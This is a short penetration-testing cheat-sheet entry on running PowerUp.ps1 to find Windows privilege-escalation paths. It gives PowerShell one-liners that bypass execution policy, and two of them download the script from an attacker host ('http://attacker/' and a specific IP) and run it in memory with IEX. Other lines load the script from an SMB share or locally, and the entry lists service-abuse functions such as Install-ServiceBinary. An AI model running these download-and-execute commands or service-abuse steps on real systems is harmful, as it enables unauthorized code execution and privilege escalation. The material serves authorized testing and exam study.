---
title: PowerUp.ps1 - Windows PrivEsc Checks
category: privesc
subcategory: windows-tools
os: windows
command: powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1');Invoke-AllChecks
tools: PowerUp.ps1
---


### In-memory load and run

```powershell
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.228/PowerUp.ps1');Invoke-AllChecks
```

### From an SMB share

```powershell
powershell -ep bypass . \\TSCLIENT\share\PowerUp.ps1;Invoke-AllChecks
```

### Local invocation

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
Invoke-AllChecks > up.log
Get-Help Invoke-ServiceAbuse -Examples
```

### From cmd, save output

```cmd
powershell -nop -ep bypass . .\PowerUp.ps1;Invoke-AllChecks > up.log
```

### Useful functions

```
Get-ModifiableServiceFile
Get-UnquotedService
Install-ServiceBinary
Write-ServiceBinary
```
